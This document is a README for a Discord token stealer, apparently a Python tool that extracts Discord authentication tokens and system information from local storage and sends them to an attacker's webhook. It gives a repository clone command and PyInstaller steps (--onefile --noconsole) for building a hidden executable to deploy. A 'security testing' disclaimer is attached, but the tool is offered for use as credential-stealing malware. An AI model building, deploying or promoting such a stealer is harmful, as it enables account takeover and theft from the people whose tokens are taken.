
# Discord Token Logger

## Overview

A Python-based utility designed for security research and penetration testing that extracts Discord authentication tokens from local storage locations and transmits them to a specified Discord webhook for analysis.

## Features

- Multi-platform token extraction from Discord clients
- Support for various browser storage locations
- System information collection for identification
- Secure webhook transmission
- Executable compilation capability for deployment

## Installation

1. Clone the repository:
```bash
git clone https://github.com/fraudmailer/logger.git
cd logger
```

2. Install required dependencies:
```bash
pip install -r requirements.txt
```

3. Configure your webhook URL in the script.

## Usage

### Python Script Execution

```bash
python logger.py
```

### Executable Compilation

1. Install PyInstaller:
```bash
pip install pyinstaller
```

2. Build the executable:
```bash
pyinstaller --onefile --noconsole discord_logger.py
```

3. Locate the compiled executable in the "dist" directory.

## Technical Implementation

The application operates through the following process:
1. Scans predefined system paths for Discord token storage
2. Applies pattern recognition to extract authentication tokens
3. Collects relevant system metadata
4. Transmits collected data via encrypted webhook connection

## Security Considerations

This tool is intended for authorized security testing and educational purposes only. Users are responsible for ensuring compliance with applicable laws and regulations. Unauthorized use of this software may violate terms of service and applicable legislation.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
